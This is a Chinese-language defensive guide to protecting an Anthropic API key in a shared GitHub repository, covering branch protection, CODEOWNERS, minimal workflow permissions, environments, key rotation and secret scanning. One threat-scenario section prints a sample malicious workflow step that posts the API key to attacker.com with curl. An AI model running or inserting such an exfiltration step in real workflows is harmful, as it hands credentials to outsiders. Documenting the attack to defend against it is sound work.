# 🔒 安全指南：保護 API Keys 在共享 Workspace

本指南說明如何在多人協作的私有 repository 中安全使用 Anthropic API Key。

---

## 🎯 威脅模型

### 潛在風險

在共享的私有 repository 中：

1. ❌ **惡意協作者**可能修改 workflow 來竊取 Secrets
2. ❌ **不小心的開發者**可能意外洩漏 Secrets
3. ❌ **Fork 的 PR**可能試圖訪問 Secrets（來自外部貢獻者）

### GitHub Secrets 內建保護

✅ Secrets 完全加密，任何人都無法直接查看（包括 admin）
✅ 日誌自動遮蔽 Secret 值
✅ Fork 的 PR 預設無法訪問 Secrets

---

## 🛡️ 多層防護策略

### 第 1 層：Branch Protection Rules（最重要！）

#### 目的
防止未授權的 workflow 修改，因為修改 workflow 可能竊取 Secrets。

#### 設置步驟

1. **前往 Repository Settings**
   - Settings → Branches → Add branch protection rule

2. **保護 `master` 分支**
   - Branch name pattern: `master`
   - 勾選以下選項：

   **必選項**：
   - ✅ **Require pull request reviews before merging**
     - Required approving reviews: **2** (至少 2 人審查)
     - ✅ Dismiss stale pull request approvals when new commits are pushed

   - ✅ **Require status checks to pass before merging**
     - 確保所有 CI/CD 測試通過

   - ✅ **Require conversation resolution before merging**
     - 所有評論必須解決

   - ✅ **Do not allow bypassing the above settings**
     - 即使是 admin 也不能繞過

   - ✅ **Restrict who can push to matching branches**
     - 只允許特定人員直接推送（建議：只有 1-2 位資深成員）

3. **保護 `.github/workflows/` 目錄**

   **額外設置 CODEOWNERS**：

---

### 第 2 層：CODEOWNERS 文件

#### 目的
確保 workflow 文件的修改必須經過特定人員審查。

#### 創建 `.github/CODEOWNERS`

```
# Workflow files require security team approval
/.github/workflows/  @your-security-lead @another-trusted-member

# AI review script requires approval
/ai-code-reviewer.js  @your-security-lead

# Any file that uses secrets
*.yml  @your-security-lead
```

#### 解釋

- 任何修改 `.github/workflows/` 的 PR 必須有指定人員的 approval
- 這些人員應該是最信任的團隊成員

---

### 第 3 層：Workflow 權限限制

#### 修改所有 workflow 文件

在每個 workflow 文件中明確限制權限：

```yaml
name: AI Code Review

on:
  pull_request:
    types: [opened, synchronize]

# 🔒 安全：限制 workflow 權限為最小必要權限
permissions:
  contents: read        # 只讀程式碼
  pull-requests: write  # 只能寫 PR 評論
  # 沒有其他權限！

jobs:
  ai-code-review:
    runs-on: ubuntu-latest

    # 更多配置...
```

#### 禁止的危險權限

❌ **絕對不要**給予以下權限（除非絕對必要）：
```yaml
permissions:
  actions: write        # 可以修改 workflows
  contents: write       # 可以推送程式碼
  packages: write       # 可以發布 packages
```

---

### 第 4 層：限制 Fork PR 訪問 Secrets

#### 使用 `pull_request_target` 的注意事項

**危險用法** ❌：
```yaml
on:
  pull_request_target:  # 危險！Fork 的 PR 可以訪問 Secrets
```

**安全用法** ✅：
```yaml
on:
  pull_request:  # 安全！Fork 的 PR 無法訪問 Secrets
    types: [opened, synchronize]
```

#### 我們的 workflow 已經使用安全的 `pull_request`

查看 `.github/workflows/ai-code-review.yml`：
```yaml
on:
  pull_request:  # ✅ 安全
    types: [opened, synchronize]
```

---

### 第 5 層：環境保護（Environment Protection）

#### 目的
為敏感操作創建需要手動批准的環境。

#### 設置步驟

1. **創建 Environment**
   - Settings → Environments → New environment
   - 名稱：`production-ai-review`

2. **配置 Protection Rules**
   - ✅ **Required reviewers**: 選擇 1-2 位信任的成員
   - ✅ **Wait timer**: 5 分鐘（給審查者時間檢查）

3. **配置 Environment Secrets**
   - 在 environment 中設置 `ANTHROPIC_API_KEY`
   - 而不是在 repository level

4. **修改 workflow 使用 environment**

```yaml
jobs:
  ai-code-review:
    runs-on: ubuntu-latest
    environment: production-ai-review  # 🔒 需要手動批准

    steps:
      # ... 原有步驟
```

**效果**：每次 workflow 運行前，需要指定的審查者手動批准。

---

### 第 6 層：監控和告警

#### 設置 Webhook 監控

監控關鍵事件：

1. **workflow 文件修改**
2. **Secrets 創建/刪除**
3. **Permission 變更**

#### 使用 GitHub Audit Log

定期檢查：
- Settings → Audit log
- 查看 Secrets 訪問記錄
- 查看 workflow 執行歷史

---

### 第 7 層：API Key 輪換策略

#### 定期輪換

- ⏰ 每 **3 個月**輪換一次 Anthropic API Key
- 📅 設置日曆提醒

#### 輪換流程

1. 在 Anthropic Console 創建新 Key
2. 在 GitHub Secrets 更新 `ANTHROPIC_API_KEY`
3. 測試新 Key 是否工作
4. 在 Anthropic Console 撤銷舊 Key

---

### 第 8 層：Secrets 掃描工具

#### 啟用 GitHub Secret Scanning

1. Settings → Security → Code security and analysis
2. 啟用：
   - ✅ **Secret scanning**
   - ✅ **Push protection**

#### 效果

- GitHub 會自動掃描 commits 中的 secrets
- 如果檢測到 secret，會阻止 push
- 自動通知你並建議撤銷

---

## 🚨 威脅場景分析

### 場景 1：惡意協作者修改 workflow 來竊取 Secret

**攻擊方式**：
```yaml
# 惡意 workflow
steps:
  - name: Steal Secret
    run: |
      echo "Secret is: ${{ secrets.ANTHROPIC_API_KEY }}"
      curl -X POST https://attacker.com/steal -d "$ANTHROPIC_API_KEY"
```

**防護措施**：
1. ✅ Branch Protection 需要 2 人審查
2. ✅ CODEOWNERS 需要安全負責人批准
3. ✅ GitHub 日誌會遮蔽 Secret（echo 會顯示 `***`）
4. ✅ Environment 需要手動批准

**結果**：❌ 攻擊失敗

---

### 場景 2：開發者不小心洩漏 Secret

**攻擊方式**：
```javascript
// 不小心寫在程式碼中
const apiKey = "sk-ant-api03-xxxxx";
```

**防護措施**：
1. ✅ GitHub Secret Scanning 會檢測到
2. ✅ Push Protection 會阻止 push
3. ✅ 自動通知開發者

**結果**：❌ 無法 push

---

### 場景 3：Fork 的 PR 嘗試訪問 Secrets

**攻擊方式**：
外部貢獻者 fork repository，修改 workflow 竊取 Secrets

**防護措施**：
1. ✅ 使用 `pull_request` 而非 `pull_request_target`
2. ✅ Fork 的 PR 無法訪問 Secrets

**結果**：❌ Secret 不會暴露給 fork

---

## ✅ 推薦的安全配置

### 最小安全配置（必須）

對於共享的私有 repository，**至少**要做到：

1. ✅ Branch Protection: 需要至少 1 人審查
2. ✅ CODEOWNERS: workflow 文件需要特定人員審查
3. ✅ Workflow 權限：最小必要權限
4. ✅ 使用 `pull_request` 而非 `pull_request_target`
5. ✅ 啟用 Secret Scanning

### 推薦配置（更安全）

1. ✅ 上述所有最小配置
2. ✅ Environment Protection: 需要手動批准
3. ✅ 定期輪換 API Keys (每 3 個月)
4. ✅ 審計日誌定期檢查（每週）

### 最高安全配置（敏感專案）

1. ✅ 上述所有推薦配置
2. ✅ 分離 Secrets 到不同的 environments
3. ✅ 使用外部 Secret 管理工具（如 HashiCorp Vault）
4. ✅ 所有 workflow 修改需要 2+ 人審查
5. ✅ 實施 Webhook 監控和告警
6. ✅ API Key 輪換頻率提高到每月

---

## 🎓 教育團隊成員

### Security Training Checklist

確保所有協作者了解：

- [ ] 什麼是 GitHub Secrets
- [ ] 為什麼不能在程式碼中硬編碼 API Keys
- [ ] 如何安全地使用 Secrets
- [ ] 如何識別可疑的 workflow 修改
- [ ] 發現安全問題時如何報告

### 程式碼審查重點

審查 PR 時特別注意：

1. ❌ 是否修改了 `.github/workflows/`？
2. ❌ 是否有 `echo` 或 `curl` 等可能洩漏 Secrets 的命令？
3. ❌ 是否改變了 workflow 的 `permissions`？
4. ❌ 是否使用了 `pull_request_target`？
5. ❌ 是否有可疑的第三方 Actions？

---

## 📊 安全檢查清單

定期（每月）執行以下檢查：

- [ ] 審查所有 workflow 文件
- [ ] 檢查 Audit Log 是否有異常
- [ ] 驗證 Branch Protection Rules 仍然啟用
- [ ] 確認 CODEOWNERS 文件正確
- [ ] 檢查是否有新的協作者（需要 onboarding）
- [ ] 驗證 Secret Scanning 仍然啟用
- [ ] 考慮是否需要輪換 API Key

---

## 🆘 洩漏應急響應

### 如果 API Key 洩漏了怎麼辦？

**立即行動**（5 分鐘內）：

1. **撤銷 API Key**
   - 前往 Anthropic Console
   - 找到對應的 Key
   - 點擊 **Revoke** 立即撤銷

2. **創建新 Key**
   - 創建新的 API Key
   - 更新 GitHub Secret

3. **通知團隊**
   - 告知所有協作者發生了什麼
   - 說明已採取的措施

**後續調查**（24 小時內）：

1. **檢查使用記錄**
   - 在 Anthropic Console 查看 API 使用記錄
   - 是否有異常的使用量？

2. **審查 Git 歷史**
   - 查找洩漏的來源
   - 使用 `git log -p` 查看所有變更

3. **更新安全措施**
   - 根據事件原因加強防護
   - 更新安全政策

---

## 💡 額外建議

### 1. 使用不同的 API Keys

**生產環境** vs **測試環境**：
- 生產 Key: 只用於 master 分支
- 測試 Key: 用於開發分支

### 2. 設置 API 使用限額

在 Anthropic Console 設置：
- 每日使用上限
- 每月預算上限

**目的**：即使 Key 洩漏，損失也有限。

### 3. 監控 API 使用

定期查看：
- API 調用次數
- Token 使用量
- 異常的使用模式

---

## 📚 參考資源

- [GitHub Secrets 文檔](https://docs.github.com/en/actions/security-guides/encrypted-secrets)
- [GitHub Security Best Practices](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Anthropic API Security](https://docs.anthropic.com/claude/reference/api-security)

---

## ✅ 總結

在共享的私有 workspace 中使用 API Keys：

1. ✅ **GitHub Secrets 本身已經很安全**（加密、無法查看、日誌遮蔽）
2. ✅ **Branch Protection 是最關鍵的防護**（防止惡意修改 workflow）
3. ✅ **多層防護策略**（CODEOWNERS、Environment、監控）
4. ✅ **定期輪換和審計**（降低長期風險）
5. ✅ **團隊教育**（提高安全意識）

**記住**：安全是一個持續的過程，而不是一次性的設置！

🔒 **保持警惕，定期檢查，持續改進。**
